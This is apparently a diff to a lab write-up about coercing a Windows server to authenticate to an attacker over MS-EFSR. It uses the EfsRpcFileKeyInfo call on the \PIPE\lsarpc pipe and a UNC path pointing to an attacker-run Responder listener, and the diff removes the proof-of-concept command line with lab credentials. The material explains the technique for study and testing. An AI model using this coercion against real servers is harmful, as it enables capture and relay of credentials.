@@ -21,14 +21,10 @@ In order to call a remote procedure to trigger an authentication from the remote
 
 Then we need to connect to the remote SMB pipe `\PIPE\lsarpc` and bind to (uuid `c681d488-d850-11d0-8c52-00c04fd90f7e`, version `1.0`) in order to perform calls to RPC functions of the `MS-EFSR` protocol.
 
-```bash
-./coerce_poc.py -d "LAB.local" -u "user1" -p "Password123!" 192.168.2.51 192.168.2.1
-```
-
 The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\lsarpc`. This pipe is connected to the protocol [[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) and allows to call RPC functions of this protocol. It will then call the remote [`EfsRpcFileKeyInfo`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/6813bfa8-1538-4c5f-982a-ad58caff3c1c) function on the Windows Server (192.168.2.1) with the following parameters:
 
 ```cpp
-EfsRpcFileKeyInfo('\\\\192.168.2.51\\share\\\x00', 0)
+EfsRpcFileKeyInfo("\\\\192.168.2.51\\share\\file.txt\x00", 0)
 ```
 
 
@@ -81,5 +77,6 @@ DWORD EfsRpcFileKeyInfo(
 ## References
 
  - Documentation of protocol [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31
+
 
  - Documentation of function `EfsRpcFileKeyInfo`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/6813bfa8-1538-4c5f-982a-ad58caff3c1c
